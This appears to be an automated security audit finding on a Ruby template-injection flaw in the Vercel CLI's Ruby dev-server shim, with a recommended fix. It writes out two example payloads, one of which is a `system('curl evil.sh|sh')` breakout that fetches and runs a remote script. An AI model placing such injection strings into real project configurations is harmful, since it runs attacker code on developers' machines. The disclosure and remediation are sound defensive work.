# [MEDIUM] Ruby template injection via unescaped entrypoint substitution in dev shim

**File:** [`packages/ruby/src/start-dev-server.ts`](https://github.com/vercel/vercel/blob/melkey/bun-working-branch/blob/melkey/packages/ruby/src/start-dev-server.ts#L101-L223) (lines 101, 114, 174, 186, 223)
**Project:** vercel
**Severity:** MEDIUM  •  **Confidence:** high  •  **Slug:** `rce`

## Owners

**Suggested assignee:** `30984749+ricardo-agz@users.noreply.github.com` _(via last-committer)_

## Finding

createDevRubyShim writes a Ruby file by performing a naive string replacement of `__VC_DEV_ENTRYPOINT__` with the user-controlled `entrypoint` value. The placeholder lives inside a double-quoted Ruby string in `vc_init_dev.rb`: `USER_ENTRYPOINT = "__VC_DEV_ENTRYPOINT__"`. Because Ruby double-quoted strings support `#{...}` interpolation as well as quote-breaking, an attacker who can control the `entrypoint` (via vercel.json or builder config in a malicious repo a developer clones) can inject arbitrary Ruby code that is executed immediately on `vercel dev` startup — before the dev server even binds and before the developer sends any HTTP requests. Example payloads (must end in `.ru` to pass the rawEntrypoint.endsWith('.ru') check at line 177): an entrypoint of `#{`whoami`}.ru` triggers shell command execution via Ruby string interpolation; an entrypoint of `x"; system('curl evil.sh|sh'); ".ru` breaks out of the string literal entirely. The substitution at line 114 (`template.replace(/__VC_DEV_ENTRYPOINT__/g, entrypoint)`) performs no escaping. While the dev environment is locally trusted, the elevation from `untrusted code runs on first request` to `untrusted code runs immediately on vercel dev start` is real and meaningful for a developer who runs `vercel dev` to inspect a third-party project.

## Recommendation

Do not interpolate user-controlled values into Ruby source via string replace. Either (a) write the entrypoint to a separate file and have the Ruby template read it (`File.read('.vercel/ruby/entrypoint.txt').chomp`), or (b) properly escape the value for Ruby double-quoted string context (escape `\\`, `"`, `#`, and other special characters). Additionally, validate the entrypoint shape strictly (e.g., must match `/^[A-Za-z0-9._\-/]+\.ru$/`) before use.

## Recent committers (`git log`)

- Ricardo Gonzalez <30984749+ricardo-agz@users.noreply.github.com> (2026-02-23)
- Nik <nik.sidnev@vercel.com> (2026-02-09)
